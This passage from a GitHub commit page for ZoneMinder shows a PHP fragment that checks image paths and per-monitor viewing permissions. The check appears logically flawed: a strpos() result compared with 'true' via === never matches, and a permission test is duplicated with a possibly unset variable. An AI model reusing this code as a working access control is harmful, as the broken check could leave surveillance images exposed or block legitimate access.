|  |  | if(strpos($path, ZM\_DIR\_EVENTS) == 0 && strpos($path, ZM\_DIR\_EVENTS) === true) { |
|  |  | if ( !empty($user['MonitorIds']) ) { |
|  |  | $imageOk = false; |
|  |  | $pathMonId = substr( $path, 0, strspn( $path, "1234567890" ) ); |
|  |  | foreach ( preg\_split( '/["\'\s]\*,["\'\s]\*/', $user['MonitorIds'] ) as $monId ) { |
|  |  | if ( $pathMonId == $monId ) { |
|  |  | $imageOk = true; |
|  |  | break; |
|  |  | } |
|  |  | } |
|  |  | if ( !$imageOk ) |
|  |  | $errorText = "No image permissions"; |
|  |  | } |
|  |  | if ( !$imageOk ) |
|  |  | $errorText = "No image permissions"; |
|  |  | } else { |
|  |  | $errorText = "Invalid image path"; |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `8b19fca`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2FZoneMinder%2Fcommit%2F8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3) to comment.

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.


